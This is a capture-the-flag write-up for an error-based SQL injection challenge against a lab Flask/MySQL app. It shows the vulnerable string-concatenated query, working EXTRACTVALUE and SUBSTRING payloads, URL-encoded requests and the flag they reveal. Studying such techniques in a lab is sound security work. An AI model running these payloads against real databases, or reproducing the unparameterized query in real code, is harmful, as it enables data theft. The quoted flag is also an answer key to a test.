# CTF Challenge: Legacy Product Finder

**Category:** Web Exploitation / SQL Injection  
**Difficulty:** Easy/Medium  
**Goal:** Retrieve the hidden flag from the database.

## 1. Reconnaissance & Analysis

### Source Code Review
Upon reviewing the provided `app/app.py` file, we identify a critical flaw in how the application handles the `id` parameter within the `index` function:

```python
# app/app.py
query = "SELECT name, description FROM products WHERE id = '" + product_id + "'"
cursor.execute(query)
```

**Vulnerability:** The application directly concatenates the user-supplied `product_id` into the SQL string without sanitization or parameterization. This is a textbook SQL Injection.

**Feedback Loop:** Looking at the `except` block:

```python
except mysql.connector.Error as err:
    db_error = f"Database Error: {err}"
```

The application catches database errors and renders them directly to the HTML template (`{{ error }}`). This confirms the vulnerability type is **Error-Based SQL Injection**.

### Database Structure
Checking `db_init/init.sql`, we see where the flag is hidden:

```sql
CREATE TABLE secrets (
    id INT PRIMARY KEY AUTO_INCREMENT,
    key_name VARCHAR(255),
    secret_value VARCHAR(255)
);
INSERT INTO secrets (key_name, secret_value) VALUES
('api_key_prototype', 'Securinets{Err0rs_L34k_M0r3_Th4n_W4t3r}');
```

## 2. Exploitation Strategy

Since the application prints database errors, we can use an XML parsing function like `EXTRACTVALUE()` (specific to MySQL/MariaDB). By passing a query as an invalid XPath argument to this function, the database will throw an error containing the result of our query.

**The Syntax:** `EXTRACTVALUE(rand(), CONCAT(0x3a, (YOUR_QUERY_HERE)))`

`0x3a` is the hex code for a colon (`:`), acting as a delimiter to separate the error text from our data.

### Step 1: Confirming Injection
We verify the injection by inputting a single quote `'` into the search bar.
**Input:** `'`
**Result:** `Database Error: ... You have an error in your SQL syntax ...`

### Step 2: Retrieving the Flag (Part 1)
We need to select the `secret_value` from the `secrets` table.

**Payload:**
```sql
' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT secret_value FROM secrets LIMIT 1)))-- -
```
**URL Encoded:** `http://localhost:5004/?id=%27+AND+EXTRACTVALUE%281%2C+CONCAT%280x3a%2C+%28SELECT+secret_value+FROM+secrets+LIMIT+1%29%29%29--+-`

**Result (Error Message):** `XPATH syntax error: ':Securinets{Err0rs_L34k_M0r3_Th'`

### Step 3: Bypassing Length Limitations
**Crucial Note:** `EXTRACTVALUE` truncates the error message at 32 characters. Looking at our result `Securinets{Err0rs_L34k_M0r3_Th`, the flag is clearly cut off. We need to use `SUBSTRING()` (or `MID()`) to get the rest of the flag.

**Payload (Part 2 - Offset 31):** We want to read from character 31 onwards.

```sql
' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT SUBSTRING(secret_value, 31) FROM secrets LIMIT 1)))-- -
```
**URL Encoded:** `http://localhost:5004/?id=%27+AND+EXTRACTVALUE%281%2C+CONCAT%280x3a%2C+%28SELECT+SUBSTRING%28secret_value%2C+31%29+FROM+secrets+LIMIT+1%29%29%29--+-`

**Result (Error Message):** `XPATH syntax error: ':4n_W4t3r}'`

## 3. Flag Assembly

We combine the two parts retrieved from the error messages:

- **Part 1:** `Securinets{Err0rs_L34k_M0r3_Th`
- **Part 2:** `4n_W4t3r}`

**Final Flag:** `Securinets{Err0rs_L34k_M0r3_Th4n_W4t3r}`
